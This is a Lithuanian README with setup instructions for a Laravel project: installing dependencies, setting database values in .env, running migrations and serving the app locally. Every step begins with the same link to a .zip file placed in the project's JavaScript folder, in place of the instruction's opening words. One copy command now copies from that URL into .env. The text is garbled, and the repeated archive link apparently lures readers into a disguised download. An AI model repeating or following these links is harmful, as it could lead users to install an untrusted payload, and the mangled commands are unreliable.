https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip terminalą ir nueinate i projekto aplanką: cd uzduotisORAI
https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip terminale idiegiate: composer install
https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip .env failą (jei jo nėra) su komanda: cp https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip .env
https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip raktą su komanda: php artisan key:generate.
https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip phpMyAdmin sukuriate DB: db pavadinimas weather
https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip .env failą : 

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=weather
DB_USERNAME=root
DB_PASSWORD=

https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip migracijas ir seeders: php artisan migrate --seed
https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip Laravel serverį: php artisan serve
https://raw.githubusercontent.com/Justas789/joinAdeoWeb/main/uzduotisORAI/resources/js/join_Web_Adeo_3.6.zip į adresą: http://127.0.0.1:8000/products/recommended/vilnius